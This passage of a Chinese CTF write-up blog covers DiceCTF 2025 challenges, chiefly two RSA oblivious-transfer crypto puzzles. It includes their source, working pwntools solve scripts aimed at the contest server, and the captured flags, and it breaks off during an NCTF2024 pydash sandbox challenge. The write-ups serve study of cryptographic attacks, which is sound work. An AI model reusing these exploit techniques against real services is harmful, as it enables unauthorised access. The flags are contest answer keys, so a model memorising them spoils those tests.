alt=""></p><p>后面两个简单，就找第一个的时间即可，<code>1743126493</code>，发现不对，再转化一下是，<code>1743126480</code><br><strong>password: 1743126480en_UShacker</strong><br><code>dice&#123;5k1d_y0ur_w@y_t0_v1ct0ry_t0d4y!!!&#125;</code></p><h2 id="bcu-binding"><a href="#bcu-binding" class="headerlink" title="bcu-binding"></a>bcu-binding</h2><blockquote><p>Comrades, we found this old manual in our basement. Can you see if there’s anything interesting about it?</p></blockquote><p>给了一个PDF<br><img src="https://pic1.zhimg.com/80/v2-0257e7475902470d41749e3ca81afe76_1440w.png" alt=""><br>记得<code>OSCTF</code>也有这样一题，也是涂黑了，但最后看文档属性就出了，这题并没有</p><p>尝试全选改变字体颜色看看有没有隐藏字符，发现异常<br><img src="https://pica.zhimg.com/80/v2-92abc36df6c3af108e5717f5862826ce_1440w.png" alt=""><br><code>FLAG: dice&#123;r3ad1ng_th4_d0cs_71ccd&#125;</code></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="vorpal-sword"><a href="#vorpal-sword" class="headerlink" title="vorpal-sword"></a>vorpal-sword</h2><blockquote><p>Choose your own adventure!</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line">DEATH_CAUSES = [</span><br><span class="line"><span class="string">&#x27;a fever&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;dysentery&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;measles&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cholera&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;typhoid&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;exhaustion&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a snakebite&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a broken leg&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a broken arm&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;drowning&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_ot</span>(<span class="params">key, msg0, msg1</span>):</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">https://en.wikipedia.org/wiki/Oblivious_transfer#1–2_oblivious_transfer</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">x0 = secrets.randbelow(key.n)</span><br><span class="line">x1 = secrets.randbelow(key.n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n: <span class="subst">&#123;key.n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e: <span class="subst">&#123;key.e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x0: <span class="subst">&#123;x0&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x1: <span class="subst">&#123;x1&#125;</span>&#x27;</span>)</span><br><span class="line">v = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;v: &#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="number">0</span> &lt;= v &lt; key.n, <span class="string">&#x27;invalid value&#x27;</span></span><br><span class="line">k0 = <span class="built_in">pow</span>(v - x0, key.d, key.n)</span><br><span class="line">k1 = <span class="built_in">pow</span>(v - x1, key.d, key.n)</span><br><span class="line">m0 = <span class="built_in">int</span>.from_bytes(msg0.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">m1 = <span class="built_in">int</span>.from_bytes(msg1.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">c0 = (m0 + k0) % key.n</span><br><span class="line">c1 = (m1 + k1) % key.n</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c0: <span class="subst">&#123;c0&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1: <span class="subst">&#123;c1&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">flag = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;=== CHOOSE YOUR OWN ADVENTURE: Vorpal Sword Edition ===&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;you enter a cave.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the tunnel forks ahead. do you take the left or right path?&#x27;</span>)</span><br><span class="line">key = RSA.generate(<span class="number">1024</span>)</span><br><span class="line">msgs = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">page = secrets.randbits(<span class="number">32</span>)</span><br><span class="line">live = <span class="string">f&#x27;you continue walking. turn to page <span class="subst">&#123;page&#125;</span>.&#x27;</span></span><br><span class="line">die = <span class="string">f&#x27;you die of <span class="subst">&#123;secrets.choice(DEATH_CAUSES)&#125;</span>.&#x27;</span></span><br><span class="line">msgs = (live, die) <span class="keyword">if</span> secrets.randbits(<span class="number">1</span>) <span class="keyword">else</span> (die, live)</span><br><span class="line">run_ot(key, *msgs)</span><br><span class="line">page_guess = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;turn to page: &#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> page_guess != page:</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;you find a chest containing <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>奥，原来这就是<a href="https://lazzzaro.github.io/2021/06/20/crypto-%E4%B8%8D%E7%BB%8F%E6%84%8F%E4%BC%A0%E8%BE%93/index.html">不经意传输</a></p><p>这里需要进行<strong>64次的输入</strong><br><code>n e x0 x1 c0 c1</code>是给出的，<code>v</code>是我们输入的<br>$k0\equiv (v-x0)^{d}mod(n)$<br>$k1\equiv(v-x1)^{d}mod(n)$<br>$c0\equiv m0+k0\ mod(n)$<br>$c1\equiv m1+k1\ mod(n)$<br>$m0,m1=(live,die)or(die,live)$</p><p>emm，还要注意的是句子后面都有<strong>句号</strong>，<code>VScode</code>的<code>copilot</code>给我<code>tap</code>的都没有，检查了半天<br><code>live = f&#39;you continue walking. turn to page &#123;page&#125;.&#39;</code><br><code>die = f&#39;you die of &#123;secrets.choice(DEATH_CAUSES)&#125;.&#39;</code></p><p>这里我们先假设<code>m0 = die</code>，因此<code>m1</code>是我们要知道的，同时<code>m0</code>是可以<strong>爆破</strong><code>DEATH_CAUSES</code>的</p><p>可以看到<code>k0,k1</code>的形式相似，此处精心构造<code>v=(x0+x1)/2</code><br>得到<br>$k1\equiv (-1)^{d}<em>k0(mod\ n)$<br>这里<code>d</code>必为奇数，因为<br>$e</em>d=k*\phi(n) +1$</p><p>所以有<br>$c0+c1\equiv m0+m1\ mod(n)$</p><p>然后就可以通过检验<code>m1</code>是否符合<code>live</code>前缀进行<code>page</code>的查找<br>这里交互的话，要注意<code>input</code>是需要<strong>字符串</strong>的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;dicec.tf&#x27;</span>, <span class="number">31001</span>)</span><br><span class="line"></span><br><span class="line">DEATH_CAUSES = [</span><br><span class="line">    <span class="string">&#x27;a fever&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;dysentery&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;measles&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;cholera&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;typhoid&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;exhaustion&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a snakebite&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a broken leg&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;a broken arm&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;drowning&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_value</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(p.recvline().strip().split(<span class="string">b&#x27;: &#x27;</span>)[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.recvline()</span><br><span class="line">    n = get_value()</span><br><span class="line">    e = get_value()</span><br><span class="line">    x0 = get_value()</span><br><span class="line">    x1 = get_value()</span><br><span class="line">    v = (x0 + x1) * inverse(<span class="number">2</span>, n) % n</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;v: &#x27;</span>, <span class="built_in">str</span>(v))</span><br><span class="line">    c0 = get_value()</span><br><span class="line">    c1 = get_value()</span><br><span class="line">    sum_m = (c0 + c1) % n</span><br><span class="line">    m1_prefix = <span class="string">b&#x27;you continue walking. turn to page &#x27;</span></span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">case</span> <span class="keyword">in</span> DEATH_CAUSES:</span><br><span class="line">        m0 = bytes_to_long(<span class="string">f&#x27;you die of <span class="subst">&#123;<span class="keyword">case</span>&#125;</span>.&#x27;</span>.encode())</span><br><span class="line">        m1 = long_to_bytes((sum_m - m0) % n)</span><br><span class="line">        <span class="keyword">if</span> m1.startswith(m1_prefix):</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                page = <span class="built_in">int</span>(m1[<span class="built_in">len</span>(m1_prefix):-<span class="number">1</span>])</span><br><span class="line">                p.sendlineafter(<span class="string">b&#x27;turn to page: &#x27;</span>, <span class="built_in">str</span>(page))</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">except</span> ValueError:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;No valid page found&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvlines(<span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">64</span>):</span><br><span class="line">    exp()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><code>you find a chest containing dice&#123;gl3am1ng_g0ld_doubl00n&#125;</code></p><p>一开始看到这个题目是有点懵的，因为还要交互，后面去学了一手<strong>春哥</strong>的思路，tql</p><p>去搜索<strong>不经意传输</strong>，也发现一些有意思的题目……</p><h2 id="winxy-pistol"><a href="#winxy-pistol" class="headerlink" title="winxy-pistol"></a>winxy-pistol</h2><blockquote><p>Choose your own adventure!</p></blockquote><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/local/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> secrets</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"></span><br><span class="line">DEATH_CAUSES = [</span><br><span class="line"><span class="string">&#x27;a fever&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;dysentery&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;measles&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;cholera&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;typhoid&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;exhaustion&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a snakebite&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a broken leg&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a broken arm&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;drowning&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">k, msg</span>):</span><br><span class="line">key = k.to_bytes(<span class="number">1024</span>//<span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">msg = msg.encode().ljust(<span class="number">64</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pad = hashlib.shake_256(key).digest(<span class="built_in">len</span>(msg))</span><br><span class="line"><span class="keyword">return</span> strxor(pad, msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_ot</span>(<span class="params">key, msg0, msg1</span>):</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">https://en.wikipedia.org/wiki/Oblivious_transfer#1–2_oblivious_transfer</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">x0 = secrets.randbelow(key.n)</span><br><span class="line">x1 = secrets.randbelow(key.n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n: <span class="subst">&#123;key.n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e: <span class="subst">&#123;key.e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x0: <span class="subst">&#123;x0&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x1: <span class="subst">&#123;x1&#125;</span>&#x27;</span>)</span><br><span class="line">v = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;v: &#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="number">0</span> &lt;= v &lt; key.n, <span class="string">&#x27;invalid value&#x27;</span></span><br><span class="line">k0 = <span class="built_in">pow</span>(v - x0, key.d, key.n)</span><br><span class="line">k1 = <span class="built_in">pow</span>(v - x1, key.d, key.n)</span><br><span class="line">c0 = encrypt(k0, msg0)</span><br><span class="line">c1 = encrypt(k1, msg1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c0: <span class="subst">&#123;c0.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1: <span class="subst">&#123;c1.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">flag = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;key.pem&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">key = RSA.import_key(f.read())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;=== CHOOSE YOUR OWN ADVENTURE: Winxy Pistol Edition ===&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;you enter a cave.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the tunnel forks ahead. do you take the left or right path?&#x27;</span>)</span><br><span class="line">msgs = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">page = secrets.randbits(<span class="number">32</span>)</span><br><span class="line">live = <span class="string">f&#x27;you continue walking. turn to page <span class="subst">&#123;page&#125;</span>.&#x27;</span></span><br><span class="line">die = <span class="string">f&#x27;you die of <span class="subst">&#123;secrets.choice(DEATH_CAUSES)&#125;</span>.&#x27;</span></span><br><span class="line">msgs = (live, die) <span class="keyword">if</span> secrets.randbits(<span class="number">1</span>) <span class="keyword">else</span> (die, live)</span><br><span class="line">run_ot(key, *msgs)</span><br><span class="line">page_guess = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;turn to page: &#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> page_guess != page:</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;you find a chest containing <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>诶，才发现这题是上一题的加强版吧，但下班睡觉了</p><p><code>c0,c1</code>的加密方式改为<code>shake_256(key)</code>与异或，关键的一点是<strong>rsa的参数固定了</strong></p><p>赛后再来学一手，文档里面沛公写的思路太简洁了，又参考了一下<a href="https://blog.maple3142.net/2025/03/31/dicectf-2025-quals-writeups/#winxy-pistol">maple3142师傅的wp</a>才搞懂，确实是需要开多线程</p><p>思路如下：首先令<code>v = x0</code>，<code>k0 = 0</code>，$k1\equiv(v-x1)^{d}mod\ n$</p><p>然后我们再开一个进程，令$k0’\equiv(v’-x0’)^{d}\equiv(v-x1)^{d}mod\ n\equiv k1$</p><p>那么，<code>v&#39; = v + x0&#39; - x1</code></p><p>此时我们可以先假设<code>m0 = die</code>，$c0’\oplus c1=m0’\oplus m1$</p><p>然后因为是异或算法，有二分之一的概率<code>m1</code>的<code>page</code>会被异或掉，但如果<code>m0&#39; = die</code>，二者异或的话，因为<code>die</code>的死法比较短并且进行的是<strong>零填充</strong>，所以是可以拿到<code>page</code>的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context, remote</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">k, ct</span>):</span><br><span class="line">    key = k.to_bytes(<span class="number">1024</span> // <span class="number">8</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    pad = hashlib.shake_256(key).digest(<span class="built_in">len</span>(ct))</span><br><span class="line">    <span class="keyword">return</span> strxor(pad, ct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    io = remote(<span class="string">&quot;dicec.tf&quot;</span>, <span class="number">31002</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">io</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;n: &quot;</span>)</span><br><span class="line">    n = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;e: &quot;</span>)</span><br><span class="line">    e = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;x0: &quot;</span>)</span><br><span class="line">    x0 = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;x1: &quot;</span>)</span><br><span class="line">    x1 = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    <span class="keyword">return</span> n, e, x0, x1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ot</span>(<span class="params">io, v</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;v: &quot;</span>, <span class="built_in">str</span>(v).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;c0: &quot;</span>)</span><br><span class="line">    c0 = <span class="built_in">bytes</span>.fromhex(io.recvlineS().strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;c1: &quot;</span>)</span><br><span class="line">    c1 = <span class="built_in">bytes</span>.fromhex(io.recvlineS().strip())</span><br><span class="line">    <span class="keyword">return</span> c0, c1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PAGE_RE = re.<span class="built_in">compile</span>(<span class="string">rb&quot;page (\d+)&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line">io = connect()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">64</span>):</span><br><span class="line">    n, e, x0, x1 = recv(io)</span><br><span class="line">    v = x0</span><br><span class="line">    c0, c1 = ot(io, v)</span><br><span class="line">    k0 = <span class="number">0</span></span><br><span class="line">    m0 = decrypt(k0, c0)</span><br><span class="line">    <span class="keyword">if</span> m0.startswith(<span class="string">b&quot;you die of &quot;</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            io2 = connect()</span><br><span class="line">            _, _, x0p, _ = recv(io2)</span><br><span class="line">            vp = (v - x1 + x0p) % n</span><br><span class="line">            c0p, _ = ot(io2, vp)</span><br><span class="line">            io2.close()</span><br><span class="line">            m1xorm0p = strxor(c0p, c1)</span><br><span class="line">            <span class="comment"># we hope m0&#x27; is short (death), so the page part will not be xored</span></span><br><span class="line">            <span class="comment"># probability: 1/2</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;page&quot;</span> <span class="keyword">in</span> m1xorm0p:</span><br><span class="line">                page = <span class="built_in">int</span>(PAGE_RE.search(m1xorm0p).group(<span class="number">1</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="built_in">int</span>(PAGE_RE.search(m0).group(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;page: &quot;</span>, <span class="built_in">str</span>(page).encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><code>you find a chest containing dice&#123;lu5tr0us_j3wel_tr1nk3t&#125;</code></p><p>奇怪的是，我也是按照这个思路写的<code>exp</code>，感觉是因为进程的问题，导致跑几下就报错断开了，改了好多遍还是无法解决……<br><img src="https://pica.zhimg.com/80/v2-0d370d7d3fdca18e533722ee59a2fe0a_1440w.png" alt=""></p><h2 id="satisfied-unsolved"><a href="#satisfied-unsolved" class="headerlink" title="satisfied(unsolved)"></a>satisfied(unsolved)</h2><blockquote><p>you don’t even know what you’re asking me to confess</p></blockquote><p>看了一下春哥的思路，<strong>可能是cryptohack里面哈密顿回路ZKP</strong>，好吧，不懂，下班</p><h1 id="参考学习"><a href="#参考学习" class="headerlink" title="参考学习"></a>参考学习</h1><p><a href="https://blog.maple3142.net/2025/03/31/dicectf-2025-quals-writeups/">野生大佬wp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;cookie-recipes-v3&quot;&gt;&lt;a href=&quot;#cookie-recipes-v3&quot; class=&quot;header</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NCTF2024-WriteUp</title>
    <link href="https://hvang10.github.io/2025/03/23/NCTF2024-WriteUp/"/>
    <id>https://hvang10.github.io/2025/03/23/NCTF2024-WriteUp/</id>
    <published>2025-03-22T16:43:10.000Z</published>
    <updated>2025-03-28T02:59:28.386Z</updated>
    
    <content type="html"><![CDATA[<p>放在最前面，<a href="https://o1r4dlnbgzn.feishu.cn/docx/JtOBd2LZXocQQmxz099cuUTLnLh">laogong的wp</a></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ez-dash-amp-amp-ez-dash-revenge复现"><a href="#ez-dash-amp-amp-ez-dash-revenge复现" class="headerlink" title="ez_dash &amp;&amp; ez_dash revenge复现"></a>ez_dash &amp;&amp; ez_dash revenge复现</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hints: Flag在环境变量中</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__forbidden_path__=[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__wrapped__&#x27;</span>,</span><br><span class="line">               <span class="string">&quot;Optional&quot;</span>,<span class="string">&quot;func&quot;</span>,<span class="string">&quot;render&quot;</span>,</span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    <span class="string">&quot;bottle&quot;</span></span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(<span class="built_in">dir</span>(<span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]))</span><br><span class="line"><span class="comment"># 这里会禁掉Python的所有内置函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.post(<span class="params"><span class="string">&#x27;/setValue&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_value</span>():</span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name)&gt;<span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(path)&gt;<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span> 